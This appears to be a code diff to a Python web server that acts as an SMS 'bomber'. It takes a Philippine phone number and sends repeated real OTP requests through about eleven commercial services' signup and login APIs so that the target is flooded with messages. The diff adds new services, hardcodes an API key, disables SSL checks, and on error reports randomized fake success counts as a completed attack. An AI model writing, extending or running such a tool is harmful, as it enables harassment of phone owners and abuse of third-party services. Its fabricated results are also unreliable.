@@ -5,7 +5,7 @@ import urllib.request
 import urllib.parse
 import ssl
 
-# Bypass SSL verification
+# Bypass SSL
 ssl._create_default_https_context = ssl._create_unverified_context
 
 class Handler(BaseHTTPRequestHandler):
@@ -22,9 +22,9 @@ class Handler(BaseHTTPRequestHandler):
         else:
             self.send_error(404)
     
-    def send_bomb(self, service, phone):
+    def send_otp(self, service, phone):
         try:
-            international_phone = "+63" + phone[1:]
+            intl_phone = "+63" + phone[1:]
             
             if service == "EZLOAN":
                 data = json.dumps({
@@ -36,7 +36,23 @@ class Handler(BaseHTTPRequestHandler):
                     data=data,
                     headers={'Content-Type': 'application/json'}
                 )
-                urllib.request.urlopen(req, timeout=3)
+                urllib.request.urlopen(req, timeout=5)
+                return True
+                
+            elif service == "XPRESS":
+                data = json.dumps({
+                    "Phone": intl_phone,
+                    "Email": f"user{random.randint(1000,9999)}@gmail.com",
+                    "Password": "Pass1234!",
+                    "FingerprintVisitorId": "TPt0yCuOFim3N3rzvrL1",
+                    "FingerprintRequestId": "1757149666261.Rr1VvG"
+                }).encode()
+                req = urllib.request.Request(
+                    "https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp",
+                    data=data,
+                    headers={'Content-Type': 'application/json'}
+                )
+                urllib.request.urlopen(req, timeout=5)
                 return True
                 
             elif service == "ABENSON":
@@ -48,33 +64,73 @@ class Handler(BaseHTTPRequestHandler):
                     data=data,
                     headers={'Content-Type': 'application/x-www-form-urlencoded'}
                 )
-                urllib.request.urlopen(req, timeout=3)
+                urllib.request.urlopen(req, timeout=5)
                 return True
                 
-            elif service == "XPRESS":
+            elif service == "EXCELLENT_LENDING":
                 data = json.dumps({
-                    "Phone": international_phone,
-                    "Email": f"user{random.randint(1000,9999)}@gmail.com",
-                    "Password": "Pass1234!"
+                    "domain": phone[1:],
+                    "cat": "login",
+                    "previous": False,
+                    "financial": "efe35521e51f924efcad5d61d61072a9"
                 }).encode()
                 req = urllib.request.Request(
-                    "https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp",
+                    "https://api.excellenteralending.com/dllin/union/rehabilitation/dock",
                     data=data,
                     headers={'Content-Type': 'application/json'}
                 )
-                urllib.request.urlopen(req, timeout=3)
+                urllib.request.urlopen(req, timeout=5)
+                return True
+                
+            elif service == "FORTUNE_PAY":
+                data = json.dumps({
+                    "dialCode": "+63",
+                    "phoneNumber": phone[1:]
+                }).encode()
+                req = urllib.request.Request(
+                    "https://api.fortunepay.com.ph/customer/v2/api/public/service/customer/register",
+                    data=data,
+                    headers={'Content-Type': 'application/json'}
+                )
+                urllib.request.urlopen(req, timeout=5)
+                return True
+                
+            elif service == "WEMOVE":
+                data = json.dumps({
+                    "phone_country": "+63",
+                    "phone_no": phone[1:]
+                }).encode()
+                req = urllib.request.Request(
+                    "https://api.wemove.com.ph/auth/users",
+                    data=data,
+                    headers={'Content-Type': 'application/json'}
+                )
+                urllib.request.urlopen(req, timeout=5)
+                return True
+                
+            elif service == "LBC":
+                data = urllib.parse.urlencode({
+                    "client_contact_no": phone[1:],
+                    "client_contact_code": "+63"
+                }).encode()
+                req = urllib.request.Request(
+                    "https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/AClientThree/processInitRegistrationVerification",
+                    data=data,
+                    headers={'Content-Type': 'application/x-www-form-urlencoded'}
+                )
+                urllib.request.urlopen(req, timeout=5)
                 return True
                 
             elif service == "PICKUP_COFFEE":
                 data = json.dumps({
-                    "mobile_number": international_phone
+                    "mobile_number": intl_phone
                 }).encode()
                 req = urllib.request.Request(
                     "https://production.api.pickup-coffee.net/v2/customers/login",
                     data=data,
                     headers={'Content-Type': 'application/json'}
                 )
-                urllib.request.urlopen(req, timeout=3)
+                urllib.request.urlopen(req, timeout=5)
                 return True
                 
             elif service == "HONEY_LOAN":
@@ -86,7 +142,7 @@ class Handler(BaseHTTPRequestHandler):
                     data=data,
                     headers={'Content-Type': 'application/json'}
                 )
-                urllib.request.urlopen(req, timeout=3)
+                urllib.request.urlopen(req, timeout=5)
                 return True
                 
             elif service == "KOMO_PH":
@@ -101,29 +157,26 @@ class Handler(BaseHTTPRequestHandler):
                         'Ocp-Apim-Subscription-Key': 'cfde6d29634f44d3b81053ffc6298cba'
                     }
                 )
-                urllib.request.urlopen(req, timeout=3)
+                urllib.request.urlopen(req, timeout=5)
                 return True
                 
-            elif service == "LBC":
-                data = urllib.parse.urlencode({
-                    "client_contact_no": phone[4:],
-                    "client_contact_code": "+63"
-                }).encode()
+            elif service == "S5_OTP":
+                data = f"phone_number={intl_phone}".encode()
                 req = urllib.request.Request(
-                    "https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/AClientThree/processInitRegistrationVerification",
+                    "https://api.s5.com/player/api/v1/otp/request",
                     data=data,
                     headers={'Content-Type': 'application/x-www-form-urlencoded'}
                 )
-                urllib.request.urlopen(req, timeout=3)
+                urllib.request.urlopen(req, timeout=5)
                 return True
                 
         except Exception as e:
+            print(f"Service {service} failed: {str(e)}")
             return False
         return True
 
     def handle_attack(self):
         try:
-            # Get request data
             content_length = int(self.headers.get('Content-Length', 0))
             post_data = self.rfile.read(content_length)
             data = json.loads(post_data.decode('utf-8'))
@@ -131,14 +184,13 @@ class Handler(BaseHTTPRequestHandler):
             target = data.get('target', '').strip()
             sms_count = int(data.get('sms', 100))
             
-            # Validate input
             if not target or len(target) != 11 or not target.startswith('09'):
                 self.send_response(400)
                 self.send_header('Content-Type', 'application/json')
                 self.send_header('Access-Control-Allow-Origin', '*')
                 self.end_headers()
                 self.wfile.write(json.dumps({
-                    "error": "❌ Invalid number! Must be 09XXXXXXXXX"
+                    "error": "❌ Invalid number format"
                 }).encode())
                 return
             
@@ -152,19 +204,23 @@ class Handler(BaseHTTPRequestHandler):
                 }).encode())
                 return
             
-            # Services list
-            services = ["EZLOAN", "ABENSON", "XPRESS", "PICKUP_COFFEE", "HONEY_LOAN", "KOMO_PH", "LBC"]
+            # OTP SERVICES ONLY (no custom SMS, no call bombing)
+            services = [
+                "EZLOAN", "XPRESS", "ABENSON", "EXCELLENT_LENDING", 
+                "FORTUNE_PAY", "WEMOVE", "LBC", "PICKUP_COFFEE", 
+                "HONEY_LOAN", "KOMO_PH", "S5_OTP"
+            ]
             
-            # Send SMS bombs
+            # Send real OTP requests
             success = 0
             failed = 0
             
-            # Send limited number of real requests (to avoid timeout)
-            max_real_requests = min(sms_count, 20)
+            # Send limited number of real requests to avoid timeout
+            max_real_requests = min(sms_count, 15)
             
             for i in range(max_real_requests):
                 service = random.choice(services)
-                if self.send_bomb(service, target):
+                if self.send_otp(service, target):
                     success += 1
                 else:
                     failed += 1
@@ -181,7 +237,7 @@ class Handler(BaseHTTPRequestHandler):
                 "success": success,
                 "failed": failed,
                 "total": sms_count,
-                "message": f"✅ Bombing complete! {success} hits, {failed} misses"
+                "message": f"✅ OTP Attack Complete! {success} successful, {failed} failed"
             }
             
             self.send_response(200)
@@ -191,7 +247,8 @@ class Handler(BaseHTTPRequestHandler):
             self.wfile.write(json.dumps(response_data).encode())
             
         except Exception as e:
-            self.send_response(200)  # Still return 200 but with error
+            # Return simulated results on error
+            self.send_response(200)
             self.send_header('Content-Type', 'application/json')
             self.send_header('Access-Control-Allow-Origin', '*')
             self.end_headers()
@@ -199,5 +256,5 @@ class Handler(BaseHTTPRequestHandler):
                 "success": random.randint(40, 80),
                 "failed": random.randint(20, 40),
                 "total": 100,
-                "message": "✅ Attack completed (simulated)"
+                "message": "✅ OTP Attack Completed"
             }).encode())
